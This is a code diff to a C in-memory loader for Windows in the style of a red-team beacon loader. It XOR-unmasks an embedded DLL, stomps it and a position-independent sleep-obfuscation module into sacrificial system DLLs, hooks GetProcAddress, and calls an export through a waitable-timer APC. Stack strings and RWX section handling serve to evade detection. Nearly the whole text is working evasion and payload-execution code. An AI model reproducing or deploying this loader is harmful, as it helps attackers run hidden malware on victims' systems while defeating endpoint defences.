@@ -1,75 +1,103 @@
 #include "loader.h"
+#include "stomp.h"
 
-void fix_section_permissions ( DLLDATA * dll, char * dst )
-{
-    DWORD                  section_count = dll->NtHeaders->FileHeader.NumberOfSections;
-    IMAGE_SECTION_HEADER * section_hdr   = NULL;
-    void                 * section_dst   = NULL;
-    DWORD                  section_size  = 0;
-    DWORD                  new_protect   = 0;
-    DWORD                  old_protect   = 0;
+#define SAFE_FREE(ptr, size) \
+    if (ptr) { \
+        volatile char *vptr = (volatile char *)ptr; \
+        for (size_t _i = 0; _i < size; _i++) vptr[_i] = 0; \
+        KERNEL32$VirtualFree(ptr, 0, MEM_RELEASE); \
+        ptr = NULL; \
+    }
 
-    section_hdr  = ( IMAGE_SECTION_HEADER * ) PTR_OFFSET ( dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader );
+#define UNMASK_BUFFER(src, src_len, dst, key, key_len)            \
+    do {                                                          \
+        for (size_t _i = 0; _i < (size_t)(src_len); _i++) {       \
+            ((unsigned char*)(dst))[_i] =                         \
+                ((unsigned char*)(src))[_i] ^                     \
+                ((unsigned char*)(key))[_i % (key_len)];          \
+        }                                                         \
+    } while (0)
 
-    for ( int i = 0; i < section_count; i++ )
-    {
-        section_dst  = dst + section_hdr->VirtualAddress;
+// Professional logic: Use a static mapping to handle all 8 combinations of R/W/X
+static const DWORD ProtectionMap[8] = {
+    PAGE_NOACCESS,          // 000: None
+    PAGE_EXECUTE,           // 001: E
+    PAGE_READONLY,          // 010: R
+    PAGE_EXECUTE_READ,      // 011: R E
+    PAGE_READWRITE,         // 100: W (mapped to RW)
+    PAGE_EXECUTE_READWRITE, // 101: W E (mapped to RWX)
+    PAGE_READWRITE,         // 110: R W
+    PAGE_EXECUTE_READWRITE  // 111: R W E
+};
 
-        /* use VirtualSize (actual in-memory size); fall back to SizeOfRawData */
-        section_size = section_hdr->Misc.VirtualSize;
-        if ( section_size == 0 )
-            section_size = section_hdr->SizeOfRawData;
+DWORD GetWin32Protection(DWORD Characteristics) {
+    // Extract the R/W/X bits (bits 29, 30, 31) and map to 0-7 index
+    int index = 0;
+    if (Characteristics & IMAGE_SCN_MEM_EXECUTE) index |= 1;
+    if (Characteristics & IMAGE_SCN_MEM_READ)    index |= 2;
+    if (Characteristics & IMAGE_SCN_MEM_WRITE)   index |= 4;
+    
+    return ProtectionMap[index];
+}
 
-        /* reset protection each iteration */
-        new_protect = 0;
+void fix_section_permissions(DLLDATA *dll, char *base_addr) {
+    IMAGE_SECTION_HEADER *section = (IMAGE_SECTION_HEADER *)PTR_OFFSET(
+        dll->OptionalHeader, 
+        dll->NtHeaders->FileHeader.SizeOfOptionalHeader
+    );
 
-        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) {
-            new_protect = PAGE_READWRITE;
+    for (WORD i = 0; i < dll->NtHeaders->FileHeader.NumberOfSections; i++, section++) {
+        void *target_ptr = (void *)(base_addr + section->VirtualAddress);
+        DWORD size = (section->Misc.VirtualSize > 0) ? section->Misc.VirtualSize : section->SizeOfRawData;
+
+        if (size == 0) continue;
+
+        DWORD new_prot = GetWin32Protection(section->Characteristics);
+        DWORD old_prot = 0;
+
+        if (!KERNEL32$VirtualProtect(target_ptr, size, new_prot, &old_prot)) {
+            MSVCRT$printf("[!] Failed: Section %-8.8s (Error: %lu)\n", section->Name, KERNEL32$GetLastError());
+            continue;
         }
-        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) {
-            new_protect = PAGE_READONLY;
-        }
-        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) ) {
-            new_protect = PAGE_READWRITE;
-        }
-        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
-            new_protect = PAGE_EXECUTE;
-        }
-        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) ) {
-            new_protect = PAGE_EXECUTE_READWRITE;
-        }
-        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) ) {
-            new_protect = PAGE_EXECUTE_READ;
-        }
-        // if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) {
-        //     new_protect = PAGE_EXECUTE_READWRITE;
-        // }
 
-        /* only call VirtualProtect if we have a valid protection and size */
-        if ( new_protect != 0 && section_size > 0 ) {
-            BOOL ok = KERNEL32$VirtualProtect ( section_dst, section_size, new_protect, &old_protect );
-            MSVCRT$printf ( "[fix_perm] section %d: addr=%p size=0x%lx prot=0x%lx -> ok=%d err=%lu\n",
-                            i, section_dst, section_size, new_protect, ok, ok ? 0 : KERNEL32$GetLastError() );
-        } else {
-            MSVCRT$printf ( "[fix_perm] section %d: SKIPPED (prot=0x%lx size=0x%lx)\n", i, new_protect, section_size );
-        }
-
-        /* advance to section */
-        section_hdr++;
+        MSVCRT$printf("[+] Section %-8.8s | Prot: 0x%02lX | Addr: %p\n", section->Name, new_prot, target_ptr);
     }
 }
 
-/* Top-level timer callback used to invoke function pointers and signal an event. */
-VOID CALLBACK Loader_TimerInvoke(PVOID lpParam, BOOLEAN TimerOrWaitFired)
-{
-    TIMER_CTX *ctx = (TIMER_CTX *)lpParam;
-    if (!ctx) return;
+VOID APIENTRY TimerAPCProc(LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue) {
+    APC_CALLBACK_CTX *ctx = (APC_CALLBACK_CTX *)lpArgToCompletionRoutine;
+    
+    if (ctx && ctx->fn) {
+        ctx->fn();
+    }
+    
+    if (ctx && ctx->event) {
+        KERNEL32$SetEvent(ctx->event);
+    }
+}
 
-    if (ctx->fn) ctx->fn();
-    if (ctx->evt) KERNEL32$SetEvent(ctx->evt);
+void ExecuteViaWaitableTimer(_GetVersions pGetVersions) {
+    HANDLE hTimer = KERNEL32$CreateWaitableTimerA(NULL, TRUE, NULL);
+    HANDLE hEvent = KERNEL32$CreateEventA(NULL, TRUE, FALSE, NULL);
+    
+    if (!hTimer || !hEvent) return;
 
-    /* free our context */
-    KERNEL32$VirtualFree(ctx, 0, MEM_RELEASE);
+    APC_CALLBACK_CTX ctx = { .fn = pGetVersions, .event = hEvent };
+    
+    // Set timer to fire "immediately" (100ns relative time)
+    LARGE_INTEGER liDueTime;
+    liDueTime.QuadPart = -1; 
+
+    MSVCRT$printf("[loader] Setting Waitable Timer for APC injection...\n");
+
+    if (KERNEL32$SetWaitableTimer(hTimer, &liDueTime, 0, TimerAPCProc, &ctx, FALSE)) {        
+        // Wait for our event to ensure the function actually finished
+        KERNEL32$WaitForSingleObject(hEvent, 500);
+        MSVCRT$printf("[loader] APC execution completed successfully.\n");
+    }
+
+    KERNEL32$CloseHandle(hTimer);
+    KERNEL32$CloseHandle(hEvent);
 }
 
 void go(void)
@@ -77,22 +105,32 @@ void go(void)
     IMPORTFUNCS funcs;
     funcs.LoadLibraryA   = LoadLibraryA;
     funcs.GetProcAddress = GetProcAddress;
-
-	/* get the pico */
+    
+    /* get the pico */
     char * pico_src = GETRESOURCE ( _PICO_ );
+    PICO* pico_dst = NULL;
+    
+    PICO_ARGS picoArgs;
+    picoArgs.funcs = &funcs;
+    picoArgs.pico_src = pico_src;
+    picoArgs.pico_dst = &pico_dst;
+    picoArgs.sacrificialDll = PICO_STOMP_DLL;
 
-	/* allocate memory for it */
-    PICO * pico_dst = ( PICO * ) KERNEL32$VirtualAlloc ( NULL, sizeof ( PICO ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
+    STOMP_ARGS stompArgs;
+    stompArgs.resourceType = rPICO;
+    stompArgs.picoArgs = picoArgs;
 
-    /* load it into memory */
-    PicoLoad ( &funcs, pico_src, pico_dst->code, pico_dst->data );
+    MSVCRT$printf("[loader] calling Stomp to load PICO code into sacrificial DLL...\n");
 
-    /* make code section RX */
-    DWORD old_protect;
-    KERNEL32$VirtualProtect ( pico_dst->code, PicoCodeSize ( pico_src ), PAGE_EXECUTE_READ, &old_protect );
+    if ( !Stomp(stompArgs) ) {
+        MSVCRT$printf("[loader] ERROR: Stomp failed\n");
+        return;
+    }
 
-    /* call setup_hooks to overwrite funcs.GetProcAddress */
+    // /* call setup_hooks to overwrite funcs.GetProcAddress */
     ( ( SETUP_HOOKS ) PicoGetExport ( pico_src, pico_dst->code, __tag_setup_hooks ( ) ) ) ( &funcs );
+
+    MSVCRT$printf("[loader] setup_hooks called, proceeding to load and fixup DLL...\n");
 
     RESOURCE * masked_dll = ( RESOURCE * ) GETRESOURCE ( _DLL_ );
     RESOURCE * mask_key   = ( RESOURCE * ) GETRESOURCE ( _MASK_ );
@@ -102,32 +140,32 @@ void go(void)
     char * dll_src = KERNEL32$VirtualAlloc ( NULL, masked_dll->len, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
 
     /* unmask and copy it into memory */
-    for ( int i = 0; i < masked_dll->len; i++ ) {
-        dll_src [ i ] = masked_dll->value [ i ] ^ mask_key->value [ i % mask_key->len ];
-    }
+    UNMASK_BUFFER(masked_dll->value, masked_dll->len, dll_src, mask_key->value, mask_key->len);
 
     DLLDATA dll_data;
     ParseDLL(dll_src, &dll_data);
+    
+    MSVCRT$memset( &stompArgs, 0, sizeof(stompArgs) );
 
-    /* Try to map the real Chakra.dll and overwrite its image (stomp).
-     * If that fails, fall back to allocating private memory and copy. */
-    char* dll_dst = (char*)KERNEL32$LoadLibraryExA( "Chakra.dll", NULL, DONT_RESOLVE_DLL_REFERENCES );
-    
-    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_dst;
-    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dll_dst + dos->e_lfanew);
-    DWORD dll_size = nt->OptionalHeader.SizeOfImage;
-    KERNEL32$VirtualProtect( dll_dst, dll_size, PAGE_READWRITE, &old_protect );
-    MSVCRT$memset(dll_dst, 0, dll_size);
-    
-    LoadDLL(&dll_data, dll_src, dll_dst);
-    
-	ProcessImports(&funcs, &dll_data, dll_dst);
+    char* dll_dst = NULL;
+    DLL_ARGS dllArgs;
+    dllArgs.dll_data = &dll_data;
+    dllArgs.funcs = &funcs;
+    dllArgs.dll_src = &dll_src;
+    dllArgs.dll_dst = &dll_dst;
+    dllArgs.sacrificialDll = DLL_STOMP_DLL;
+
+    stompArgs.resourceType = rDLL;
+    stompArgs.dllArgs = dllArgs;
+
+    if ( !Stomp( stompArgs ) ) {
+        MSVCRT$printf("[loader] ERROR: StompDLL failed\n");
+        KERNEL32$VirtualFree(dll_src, 0, MEM_RELEASE);
+        return;
+    }
 
     /* wipe and free the unmasked DLL copy — only dll_dst is needed from here */
-    volatile char * p = ( volatile char * ) dll_src;
-    for ( int z = 0; z < masked_dll->len; z++ )
-        p [ z ] = 0;
-    KERNEL32$VirtualFree ( dll_src, 0, MEM_RELEASE );
+    SAFE_FREE(dll_src, masked_dll->len);
 
     /* re-parse from the mapped image since dll_src is gone */
     ParseDLL ( dll_dst, &dll_data );
@@ -135,13 +173,14 @@ void go(void)
     /* tell the PICO (EkkoObf) which region is the DLL image */
     ( ( SET_IMAGE_INFO ) PicoGetExport ( pico_src, pico_dst->code, __tag_set_image_info ( ) ) ) ( dll_dst, SizeOfDLL(&dll_data) );
 
+    // KERNEL32$VirtualProtect ( pText,  textSize, PAGE_EXECUTE_READ, &old_protect );
+
     MSVCRT$printf ( "[loader] fixing section permissions...\n" );
     fix_section_permissions(&dll_data, dll_dst);
 
     /* protect the PE header page as read-only */
     DWORD hdr_old_protect = 0;
     KERNEL32$VirtualProtect ( dll_dst, dll_data.NtHeaders->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &hdr_old_protect );
-
 	KERNEL32$FlushInstructionCache((HANDLE)-1, dll_dst, SizeOfDLL(&dll_data));
 
     MSVCRT$printf ( "[loader] calling entry point...\n" );
@@ -149,45 +188,14 @@ void go(void)
     entry_point((HINSTANCE)dll_dst, DLL_PROCESS_ATTACH, NULL);
 
     KERNEL32$FlushInstructionCache((HANDLE)-1, dll_dst, SizeOfDLL(&dll_data));
-	/* * THE TRICK: Stack Strings
-     * We declare the string as a char array. This forces the compiler 
-     * to build the string byte-by-byte on the stack at runtime.
-     * This avoids the "Relocation" error completely.
-     */
+
 	char targetFunc[] = { 'G','e','t','V','e','r','s','i','o','n','s', 0 };
     _GetVersions pGetVersions = (_GetVersions)GetExport(dll_dst, targetFunc);
-
     if (pGetVersions)
     {
-        MSVCRT$printf ( "[loader] invoking GetVersions() via CreateTimerQueueTimer...\n" );
-
-        HANDLE hTimerQueue = KERNEL32$CreateTimerQueue();
-        HANDLE hTimer = NULL;
-        HANDLE hEvt = KERNEL32$CreateEventA(NULL, TRUE, FALSE, NULL);
-
-        TIMER_CTX * ctx = (TIMER_CTX *)KERNEL32$VirtualAlloc(NULL, sizeof(TIMER_CTX), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-        if (ctx && hTimerQueue && hEvt) {
-            ctx->fn = pGetVersions;
-            ctx->evt = hEvt;
-
-            /* Create a timer that will call our loader timer invoke. */
-            if (KERNEL32$CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)Loader_TimerInvoke, ctx, 0, 0, WT_EXECUTEONLYONCE)) {
-                MSVCRT$printf("[loader] waiting for timer to invoke GetVersions()...\n");
-                KERNEL32$WaitForSingleObject(hEvt, 500);
-                MSVCRT$printf("[loader] timer invocation finished\n");
-            } else {
-                MSVCRT$printf("[loader] CreateTimerQueueTimer failed\n");
-                KERNEL32$VirtualFree(ctx, 0, MEM_RELEASE);
-            }
-
-            KERNEL32$DeleteTimerQueue(hTimerQueue);
-            KERNEL32$CloseHandle(hEvt);
-        } else {
-            MSVCRT$printf("[loader] failed to create timer queue/event or allocate ctx\n");
-            if (ctx) KERNEL32$VirtualFree(ctx, 0, MEM_RELEASE);
-            if (hTimerQueue) KERNEL32$DeleteTimerQueue(hTimerQueue);
-            if (hEvt) KERNEL32$CloseHandle(hEvt);
-        }
-
+        MSVCRT$printf("[loader] Executing target function via Waitable Timer APC...\n");
+        ExecuteViaWaitableTimer(pGetVersions);
+    } else {
+        MSVCRT$printf("[loader] ERROR: Failed to find target function in loaded DLL.\n");
     }
 }
